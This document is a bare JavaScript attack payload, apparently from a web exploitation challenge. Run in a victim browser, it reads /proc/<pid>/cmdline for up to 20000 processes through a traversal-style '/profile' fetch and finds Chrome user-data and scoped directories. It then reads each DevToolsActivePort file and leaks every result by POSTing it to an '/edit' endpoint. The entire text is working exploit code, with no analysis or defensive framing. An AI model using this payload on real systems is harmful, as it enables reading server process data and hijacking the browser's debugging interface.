(async()=>{
const post=t=>fetch('/edit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:()]/g,' '))});
const read=async p=>{
 try{
  let r=await fetch('/profile'+p+'%3f',{cache:'no-store'});
  return [r.status,await r.text()];
 }catch(e){return [0,'']}
};

post('profile scan 0615v');
let found=0;
for(let pid=1;pid<20000;pid++){
 let [st,c]=await read('/proc/'+pid+'/cmdline');
 if(st!==200||!c.includes('user-data-dir'))continue;
 found++;
 post('pid '+pid);
 post('cmd '+c.slice(0,500));

 let dirs=[];
 let m=[...c.matchAll(/--user-data-dir=([^.]*(?:\.(?!--)[^.]*)*)/g)];
 for(let x of m){
  let d=x[1].replace(/\.+$/,'');
  if(d&&!dirs.includes(d))dirs.push(d);
 }
 let scoped=[...c.matchAll(/(\/tmp\/\.[A-Za-z0-9._-]*scoped_dir\.[A-Za-z0-9]+)/g)];
 for(let x of scoped){
  if(!dirs.includes(x[1]))dirs.push(x[1]);
 }

 if(!dirs.length)post('dir none');
 for(let d of dirs){
  post('dir '+d);
  let [ds,dt]=await read(d+'/DevToolsActivePort');
  post('dtap '+ds+' '+dt.length+' '+dt.slice(0,200));
 }
}
post('profile scan done '+found);
})();
